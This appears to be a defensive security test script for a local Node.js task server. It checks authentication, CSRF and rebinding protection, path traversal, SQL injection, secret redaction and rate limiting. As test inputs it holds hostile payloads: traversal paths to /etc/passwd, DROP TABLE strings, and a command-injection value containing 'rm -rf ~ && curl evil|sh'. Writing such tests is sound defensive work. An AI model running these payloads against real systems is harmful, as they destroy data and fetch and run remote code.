// Server security tests (fake credentials only). Usage: node scripts/security-test.mjs
import os from 'os'; globalThis.__os = os;
// Starts its own server on a temp data dir and port 8795.
import { spawn } from 'child_process'; import fs from 'fs'; import http from 'http';
const PORT = 8795, UD = '/tmp/mk-sec-test', B = `http://127.0.0.1:${PORT}`; fs.rmSync(UD, { recursive: true, force: true });
const srv = spawn(process.execPath, ['server.js'], { env: { ...process.env, NODE_ENV: 'test', STUDIO_FLAVOR: process.env.STUDIO_FLAVOR || 'prod', STUDIO_DATA_DIR: UD, PORT: String(PORT) }, stdio: 'ignore' });
const sleep = ms => new Promise(r => setTimeout(r, ms)); await sleep(2500);
const res = []; const ok = (n, c, x = '') => { res.push([n, !!c]); console.log((c ? 'PASS ' : 'FAIL ') + n + (x ? ' — ' + x : '')); };
const R = { 'x-studio-request': '1', 'content-type': 'application/json' };
// raw request so we can forge the Host header (fetch forbids it)
const raw = (method, path, headers = {}, body) => new Promise(r => { const q = http.request({ host: '127.0.0.1', port: PORT, method, path, headers }, s => { let d = ''; s.on('data', c => d += c); s.on('end', () => r({ status: s.statusCode, body: d, headers: s.headers })); }); if (body) q.write(body); q.end(); });
// setup with fake password
let r = await fetch(B + '/api/auth/setup', { method: 'POST', headers: R, body: JSON.stringify({ username: 'igor', password: 'fake-password-123' }) });
const cookie = (r.headers.get('set-cookie') || '').split(';')[0]; const A = { ...R, cookie };
ok('setup works (fake creds)', r.ok);
ok('session cookie HttpOnly + SameSite=Strict', /HttpOnly/.test(r.headers.get('set-cookie')) && /SameSite=Strict/.test(r.headers.get('set-cookie')));
for (const p of ['/api/tasks', '/api/agents', '/api/meta/config', '/api/backup', '/api/runtime', '/api/system', '/files/x.txt']) ok('401 without auth: ' + p, (await fetch(B + p)).status === 401);
ok('401 POST without auth', (await fetch(B + '/api/tasks', { method: 'POST', headers: R, body: '{}' })).status === 401);
ok('Host header rebinding rejected (421)', (await raw('GET', '/api/health', { host: 'attacker.example:' + PORT })).status === 421);
ok('Host header rebinding rejected on login', (await raw('POST', '/api/auth/login', { host: 'rebind.attacker.example', 'content-type': 'application/json', 'x-studio-request': '1' }, '{}')).status === 421);
ok('cross-origin POST rejected (Origin http://127.0.0.1:3000)', (await fetch(B + '/api/tasks', { method: 'POST', headers: { ...A, origin: 'http://127.0.0.1:3000' }, body: '{"title":"x"}' })).status === 403);
ok('Sec-Fetch-Site: cross-site rejected', (await fetch(B + '/api/tasks', { method: 'POST', headers: { ...A, 'sec-fetch-site': 'cross-site' }, body: '{"title":"x"}' })).status === 403);
ok('CSRF: cookie-auth POST without X-Studio-Request rejected', (await fetch(B + '/api/tasks', { method: 'POST', headers: { cookie, 'content-type': 'text/plain' }, body: '{"title":"x"}' })).status === 403);
ok('CSRF: logout without header rejected', (await fetch(B + '/api/auth/logout', { method: 'POST', headers: { cookie } })).status === 403);
const h = await fetch(B + '/'); ok('CSP header present and strict script-src', /script-src 'self'(;|$)/.test(h.headers.get('content-security-policy') || ''));
ok('X-Frame-Options DENY, nosniff', h.headers.get('x-frame-options') === 'DENY' && h.headers.get('x-content-type-options') === 'nosniff');
// path traversal on /files and static
for (const p of ['/files/../studio.db', '/files/..%2fstudio.db', '/files/%2e%2e/secret.key', '/files/..%2f..%2fetc%2fpasswd', '/../data/studio.db', '/%2e%2e/server.js', '/files/.hidden'])
  { const x = await raw('GET', p, { host: `127.0.0.1:${PORT}`, cookie }); ok('path traversal blocked: ' + p, x.status >= 400 && !/SQLite format|BEGIN|module\.exports|root:/.test(x.body), 'HTTP ' + x.status); }
const up = await fetch(B + '/api/files/upload?name=' + encodeURIComponent('../../evil.html'), { method: 'POST', headers: { ...A, 'content-type': 'text/html' }, body: '<script>alert(1)</script>' }); const uj = await up.json();
ok('upload name sanitized (no traversal)', up.ok && !uj.url.includes('..') && fs.existsSync(UD + '/files') && !fs.existsSync(UD + '/evil.html') && !fs.existsSync('/tmp/evil.html'), uj.url);
const fh = await fetch(B + uj.url, { headers: { cookie } }); ok('uploaded HTML served as attachment + CSP sandbox', /attachment/.test(fh.headers.get('content-disposition') || '') && /sandbox/.test(fh.headers.get('content-security-policy') || ''));
// SQL injection attempts
const inj = ["x' OR '1'='1", "tasks'; DROP TABLE items; --", "1; DELETE FROM meta"];
for (const s of inj) { const a = await fetch(B + '/api/tasks/' + encodeURIComponent(s), { headers: A }); ok('SQLi id rejected safely: ' + s, a.status === 404); }
ok('SQLi collection name rejected', (await fetch(B + '/api/' + encodeURIComponent("items' --"), { headers: A })).status === 404);
const t = await (await fetch(B + '/api/tasks', { method: 'POST', headers: A, body: JSON.stringify({ title: "Robert'); DROP TABLE items;--", agentId: 'analytics' }) })).json();
ok('SQLi payload stored as data, table intact', (await (await fetch(B + '/api/tasks/' + t.id, { headers: A })).json()).title.includes('DROP') && (await fetch(B + '/api/agents', { headers: A })).ok);
// approval bypass + agent command injection
const ct = await (await fetch(B + '/api/tasks', { method: 'POST', headers: A, body: JSON.stringify({ title: '$(touch /tmp/mk-pwned); `id`', description: '; rm -rf ~ && curl evil|sh', agentId: 'director', kind: 'code', status: 'queued', codeApproved: true }) })).json();
ok('codeApproved cannot be set via generic API', ct.codeApproved !== true);
const pt = await (await fetch(B + '/api/tasks/' + ct.id, { method: 'PUT', headers: A, body: JSON.stringify({ codeApproved: true, codeApprovedBy: 'attacker' }) })).json();
ok('codeApproved cannot be set via PUT', pt.codeApproved !== true);
await fetch(B + '/api/tasks/' + ct.id + '/approve-code', { method: 'POST', headers: A }); await fetch(B + '/api/agents/director/start', { method: 'POST', headers: A }); await sleep(6500);
const ct2r = await fetch(B + '/api/tasks/' + ct.id, { headers: A }); const ct2 = await ct2r.json(); if (!ct2.status) console.log('DEBUG', ct2r.status, JSON.stringify(ct2), ct.id);
ok('OpenCode disabled by default → blocked, no shell executed', ct2.status === 'blocked' && /отключён/.test(ct2.blockedReason) && !fs.existsSync('/tmp/mk-pwned'), ct2.status + ' ' + ct2.blockedReason);
await fetch(B + '/api/agents/director/stop', { method: 'POST', headers: A });
ok('agent start with unknown id → 400', (await fetch(B + '/api/agents/' + encodeURIComponent('../../x') + '/start', { method: 'POST', headers: A })).status >= 400);
ok('integration test refuses non-http URL', await (async () => { await fetch(B + '/api/integrations/ollama', { method: 'PUT', headers: A, body: JSON.stringify({ url: 'file:///etc/passwd' }) }); return (await fetch(B + '/api/integrations/ollama/test', { method: 'POST', headers: A })).status === 400; })());
// secrets + redaction
await fetch(B + '/api/meta/config', { method: 'PUT', headers: A, body: JSON.stringify({ appId: '1234567890', appSecret: 'FAKE-SECRET-should-never-leak', redirectUri: 'http://localhost/x' }) });
const mc = await (await fetch(B + '/api/meta/config', { headers: A })).text(); ok('meta secret never returned by API', !mc.includes('FAKE-SECRET'));
const dbRaw = fs.readFileSync(UD + '/studio.db').toString('latin1') + (fs.existsSync(UD + '/studio.db-wal') ? fs.readFileSync(UD + '/studio.db-wal').toString('latin1') : '');
ok('meta secret not stored in plaintext', !dbRaw.includes('FAKE-SECRET'));
ok('session token not stored in plaintext', !dbRaw.includes(cookie.split('=')[1]));
await fetch(B + '/api/logs', { method: 'POST', headers: A, body: JSON.stringify({ level: 'info', source: 'test', message: 'x' }) });
await fetch(B + '/api/tasks', { method: 'POST', headers: A, body: JSON.stringify({ title: 'token test access_token=EAAFAKEFAKEFAKEFAKEFAKEFAKE123 client_secret=FAKE' }) });
const logs = JSON.stringify(await (await fetch(B + '/api/logs', { headers: A })).json());
ok('logs redact tokens/secrets', !/EAAFAKEFAKE|client_secret=FAKE/.test(logs) && /REDACTED/.test(logs));
const backup = await (await fetch(B + '/api/backup', { headers: A })).text(); { const bj = JSON.parse(backup); // v1.2.2 (QA-DB-001): users exported as scrypt HASHES only; no plaintext password, no sessions, no app token, no secrets
  ok('backup export has no secrets / plaintext passwords / sessions', !backup.includes('FAKE-SECRET') && !backup.includes('fake-password-123') && !/"sessions"|mk_session|app-token/.test(backup));
  ok('backup export: users = password hashes only, jobs tables included', Array.isArray(bj.users) && bj.users.length > 0 && bj.users.every(u => Object.keys(u).sort().join() === 'passwordHash,username' && /^[a-f0-9]{32}:[a-f0-9]{128}$/.test(u.passwordHash)) && Array.isArray(bj.jobs) && Array.isArray(bj.jobEvents)); }
// app token rules
const tok = fs.readFileSync(UD + '/app-token', 'utf8').trim(); ok('app-token file is 0600', (fs.statSync(UD + '/app-token').mode & 0o777) === 0o600);
ok('app token accepted from loopback without Origin', (await fetch(B + '/api/tasks', { headers: { 'x-studio-app-token': tok } })).status === 200);
ok('app token rejected with foreign Origin', (await fetch(B + '/api/tasks', { headers: { 'x-studio-app-token': tok, origin: 'http://evil.example' } })).status === 401);
ok('wrong app token rejected', (await fetch(B + '/api/tasks', { headers: { 'x-studio-app-token': 'a'.repeat(64) } })).status === 401);
ok('no CORS granted (no Access-Control-Allow-Origin)', !(await fetch(B + '/api/health', { headers: { origin: 'http://evil.example' } })).headers.get('access-control-allow-origin'));
await fetch(B + '/api/auth/logout', { method: 'POST', headers: A });
const st = await (await fetch(B + '/api/auth/status', { headers: { 'x-studio-app-token': tok } })).json(); ok('«Выйти» disables app auto-login (no immediate re-login)', !st.user);
await fetch(B + '/api/auth/login', { method: 'POST', headers: R, body: JSON.stringify({ username: 'igor', password: 'fake-password-123' }) });
const st2 = await (await fetch(B + '/api/auth/status', { headers: { 'x-studio-app-token': tok } })).json(); ok('password login re-enables app auto-login', st2.user === 'igor');
// login rate limit
let last; for (let i = 0; i < 7; i++) last = await fetch(B + '/api/auth/login', { method: 'POST', headers: R, body: JSON.stringify({ username: 'igor', password: 'wrong' }) });
ok('login rate limited after repeated failures (429)', last.status === 429);
ok('server bound to 127.0.0.1 only', await new Promise(r => { const ifs = Object.values((await_import_os()).networkInterfaces()).flat().filter(i => i.family === 'IPv4' && !i.internal); if (!ifs.length) return r(true);
  const q = http.get({ host: ifs[0].address, port: PORT, path: '/api/health', timeout: 2000 }, () => r(false)); q.on('error', () => r(true)); q.on('timeout', () => { q.destroy(); r(true); }); }));
function await_import_os() { return globalThis.__os; }
srv.kill('SIGTERM'); console.log(JSON.stringify({ passed: res.filter(x => x[1]).length, failed: res.filter(x => !x[1]).map(x => x[0]) }));
process.exit(res.every(x => x[1]) ? 0 : 1);
